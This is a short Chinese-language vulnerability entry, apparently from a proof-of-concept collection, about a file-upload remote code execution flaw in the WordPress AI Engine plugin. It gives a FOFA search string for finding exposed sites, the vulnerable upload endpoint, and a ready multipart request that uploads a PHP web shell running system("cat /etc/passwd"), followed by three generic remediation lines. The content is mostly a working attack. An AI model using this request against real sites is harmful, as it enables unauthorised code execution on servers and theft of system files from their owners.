# WordPressAIEngine插件文件上传致RCE漏洞

- **系统**：WordPress　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`"wp-content/plugins/ai-engine/"`
- **请求**：`POST /wp-json/mwai-ui/v1/files/upload HTTP/1.1`

**请求体 / payload**
```
1、fofa
"wp-content/plugins/ai-engine/"
2、隐患url，验证如下
Host: your-ip
Content-Disposition: form-data; filename="test.txt"
Content-Type: multipart/form-data; boundary=------------------------8ecd2b831e8d20f4
--------------------------8ecd2b831e8d20f4
Content-Disposition: form-data; name="file"; filename="test.php"
Content-Type: text/plain
<?php system("cat /etc/passwd");?>
--------------------------8ecd2b831e8d20f4--
验证
```

**其他**
- 修复建议: 1、请联系厂商进行修复。
 2、如非必要，禁止公网访问该系统。
 3、设置白名单访问。